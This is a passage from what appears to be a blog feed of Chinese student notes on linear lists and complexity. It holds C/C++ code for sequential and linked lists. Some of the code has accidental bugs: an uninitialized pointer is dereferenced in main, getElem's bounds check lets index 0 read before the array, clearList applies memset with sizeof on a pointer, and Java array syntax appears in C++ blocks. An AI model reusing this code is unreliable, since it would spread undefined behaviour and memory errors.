&#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(linkList *headNode, linkList headNode2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || headNode2 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode1 = (*headNode)-&gt;next, *moveNode2 = headNode2-&gt;next, *moveNodeC = (*headNode);<br>    <span class="hljs-keyword">while</span> (moveNode1 != <span class="hljs-literal">NULL</span> &amp;&amp; moveNode2 != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (moveNode1-&gt;elem &gt; moveNode2-&gt;elem) &#123;<br>            moveNodeC-&gt;next = moveNode2;<br>            moveNode2 = moveNode2-&gt;next;<br>            moveNodeC=moveNodeC-&gt;next;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            moveNodeC-&gt;next = moveNode1;<br>            moveNode1 = moveNode1-&gt;next;<br>            moveNodeC=moveNodeC-&gt;next;<br>        &#125;<br>    &#125;<br>    moveNodeC-&gt;next = moveNode1==<span class="hljs-literal">NULL</span> ? moveNode2 : moveNode1;<br>    <span class="hljs-built_in">free</span>(headNode2);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, moveNode-&gt;elem);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode1=<span class="hljs-literal">NULL</span>;<br>    linkList headNode2=<span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode1);<br>    initList(&amp;headNode2);<br>    printfNode(headNode1);<br>    combineList(&amp;headNode1,headNode2);<br>    printfNode(headNode1);<br>    destroyList(headNode1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线性表</title>
    <link href="/2023/03/27/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/2023/03/27/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="时间和空间复杂度"><a href="#时间和空间复杂度" class="headerlink" title="时间和空间复杂度"></a>时间和空间复杂度</h3><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322151152567.png" alt="image-20230322151152567"></p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322151451180.png" alt="image-20230322151451180"></p><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><ol><li><p>使用big O计数法</p></li><li><p>实例</p><ul><li><p>O(1)  常量级的算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> c=<span class="hljs-number">0</span>;<br>a=b;<br>a=c;<br>b=c;<br><span class="hljs-comment">//就算重复1000000+都是一个常量</span><br></code></pre></td></tr></table></figure></li><li><p>O(n)   </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i)&#123;<br>    <span class="hljs-comment">//代码</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>O(logN) </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">while</span>(i&lt;n)&#123;<br>    i*=<span class="hljs-number">2</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322182248288.png" alt="image-20230322182248288" style="zoom:50%;" /></li><li><p>O(NM)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;++j)&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><ol><li><p>实例</p><ul><li><p>O(1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>O(n)  new 一个维数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span>[] newArray = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i)&#123;<br>    newArray[i]=i;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>O(n*n)  new 二个维数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> [][] newArray = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n][n];<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id="线性表（案例分析）"><a href="#线性表（案例分析）" class="headerlink" title="线性表（案例分析）"></a>线性表（案例分析）</h3><ol><li><p>线性表具有同一种特性的数据元素的一个有限的序列</p><p>![image-20230322183519529](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322183519529.png)</p></li><li><p>注意</p><ul><li>下标由1开始</li></ul></li><li><p>基本代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX =<span class="hljs-number">100</span>;<br><span class="hljs-comment">//顺序结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">List</span>&#123;<br>    ELETMENT List[MAX];<br>    <span class="hljs-type">int</span> listLenth;<br>&#125;List;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322155844508.png" alt="image-20230322155844508"></p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322155956690.png" alt="image-20230322155956690"></p></li><li><p>缺点</p><ul><li>存储空间分配不灵活</li><li>空间复杂度高</li></ul></li></ol><h3 id="线性表的类型定义"><a href="#线性表的类型定义" class="headerlink" title="线性表的类型定义"></a>线性表的类型定义</h3><ol><li>线性表的操作<ul><li><p>线性表的初始化（<code>IniList</code>）![image-20230322191953037](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191953037.png)</p></li><li><p>线性表的销毁（<code>DestroyList</code>）</p><p>连本身都没有了</p><p>![image-20230322192004208](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192004208.png)</p></li><li><p>线性表的清楚（<code>ClearList</code>）</p><p>还存在，但是是一个空表</p><p>![image-20230322192014702](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192014702.png)</p></li><li><p>判断线性表是否为空（<code>ListEmpty</code>）</p><p>![image-20230322192029109](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192029109.png)</p></li><li><p>求线性表的长度（<code>ListLength</code>）</p><p>![image-20230322192050448](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192050448.png)</p></li><li><p>获取元素(<code>GetElem</code>)</p><p>![image-20230322190529314](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190529314.png)</p></li><li><p>查找元素（<code>LocateElem</code>）</p><p>![image-20230322190615757](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190615757.png)</p></li><li><p>求一个元素的前驱（<code>PrioElem</code>）</p><p>![image-20230322190742641](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190742641.png)</p></li><li><p>获得一个元素的后继（<code>NextElem</code>）</p><p>![image-20230322190833997](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190833997.png)</p></li><li><p>插入一个元素（<code>ListInsert</code>）</p><p>![image-20230322191334889](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191334889.png)</p></li><li><p>删除一个元素（<code>ListDelete</code>）</p><p>![image-20230322191749620](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191749620.png)</p></li><li><p>遍历线性表（<code>LIstTraverse</code>）</p><p>![image-20230322191844657](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191844657.png)</p></li></ul></li></ol><h3 id="线性表的存储结构"><a href="#线性表的存储结构" class="headerlink" title="线性表的存储结构"></a>线性表的存储结构</h3><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><ol><li><p>定义：把逻辑上相邻的数据元素存储在物理相邻的存储单元</p><p>![image-20230322192505711](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192505711.png)</p></li></ol><h3 id="线性表的顺序表示和实现"><a href="#线性表的顺序表示和实现" class="headerlink" title="线性表的顺序表示和实现"></a>线性表的顺序表示和实现</h3><ol><li><p>实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">//基本模板</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define  SIZE 100</span><br><span class="hljs-comment">typedef struct&#123;</span><br><span class="hljs-comment">    ElemType elem[SIZE];</span><br><span class="hljs-comment">    int length;</span><br><span class="hljs-comment">&#125;SqList;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">//int 型</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> intElem[SIZE];<br>    <span class="hljs-type">int</span> length;<br>&#125;intList;<br><br><span class="hljs-comment">//int double</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> intElem;<br>    <span class="hljs-type">double</span> doubleElem;<br>&#125;Polynomial;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Polynomial * PPolynomial;<br>    <span class="hljs-type">int</span> length;<br>&#125;PolynomialList;<br><br><br><span class="hljs-comment">//struct</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span>* name;<br>    <span class="hljs-type">char</span>* author;<br>    <span class="hljs-type">float</span> price;<br>    <span class="hljs-type">int</span> num;<br>&#125;Book;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Book* pBook;<br>    <span class="hljs-type">int</span> length;<br>&#125;BookList;<br><br><br></code></pre></td></tr></table></figure></li></ol><h3 id="类C语言相关操作"><a href="#类C语言相关操作" class="headerlink" title="类C语言相关操作"></a>类C语言相关操作</h3><ol><li><p><code>ElemType</code> 元素</p></li><li><p>C语言动态内存分配</p></li></ol><ul><li><p><code>malloc</code>: 开辟连续的地址空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">intList *pIntList=(intList*) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (intList)*SIZE);<br><span class="hljs-built_in">free</span>(pIntList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="线性表的顺序存储"><a href="#线性表的顺序存储" class="headerlink" title="线性表的顺序存储"></a>线性表的顺序存储</h3><p>![image-20230323091558306](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230323091558306.png)</p><ol><li><p>代码示例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;string.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; IntList;<br><br><span class="hljs-function">status <span class="hljs-title">initList_Sq</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">destroyList</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">clearList</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">getListLength</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">getElem</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> i, ElemType *e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">isEmpty</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">locateElem</span><span class="hljs-params">(IntList *list, ElemType e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">listInsert</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">listDelete</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType *e)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    ElemType *e;<br>    IntList *list = (IntList *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(IntList));<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initList_Sq</span>(list) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(ERROR);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        list-&gt;elem[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        list-&gt;length++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, list-&gt;elem[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">clearList</span>(list);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>, <span class="hljs-built_in">isEmpty</span>(list) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        list-&gt;elem[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        list-&gt;length++;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, <span class="hljs-built_in">getListLength</span>(list));<br>    <span class="hljs-built_in">getElem</span>(list, <span class="hljs-number">4</span>, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c\n&quot;</span>, *e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">locateElem</span>(list, <span class="hljs-string">&#x27;d&#x27;</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">locateElem</span>(list, <span class="hljs-string">&#x27;D&#x27;</span>));<br>    <span class="hljs-built_in">listInsert</span>(list, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, list-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">listDelete</span>(list,<span class="hljs-number">5</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>,*e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,list-&gt;elem);<br><br>    <span class="hljs-built_in">listDelete</span>(list,<span class="hljs-number">26</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c\n&quot;</span>,*e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,list-&gt;elem);<br><br>    <span class="hljs-built_in">destroyList</span>(list);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//删除</span><br><span class="hljs-function">status <span class="hljs-title">listDelete</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType *e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s &lt; <span class="hljs-number">1</span> || s &gt; list-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=list-&gt;elem[s<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s - <span class="hljs-number">1</span>; i &lt; list-&gt;length - <span class="hljs-number">1</span>; ++i) &#123;<br>        list-&gt;elem[i] = list-&gt;elem[i + <span class="hljs-number">1</span>];<br>    &#125;<br>    list-&gt;elem[--list-&gt;length] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//插入</span><br><span class="hljs-function">status <span class="hljs-title">listInsert</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s &gt; SIZE || s &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = list-&gt;length - <span class="hljs-number">1</span>; i &gt;= s - <span class="hljs-number">1</span>; --i) &#123;<br>        list-&gt;elem[i + <span class="hljs-number">1</span>] = list-&gt;elem[i];<br>    &#125;<br>    list-&gt;elem[s - <span class="hljs-number">1</span>] = e;<br>    list-&gt;length++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//顺序查找空间复杂度为  O(n)</span><br><span class="hljs-function">status <span class="hljs-title">locateElem</span><span class="hljs-params">(IntList *list, ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (e == list-&gt;elem[i]) &#123;<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">getElem</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> i, ElemType *e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt; list-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e = list-&gt;elem[i - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">getListLength</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!list) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> list-&gt;length;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">isEmpty</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (list-&gt;length == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">clearList</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-built_in">memset</span>(list-&gt;elem, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(list-&gt;elem));<br>    list-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">destroyList</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (list) <span class="hljs-built_in">free</span>(list);<br>    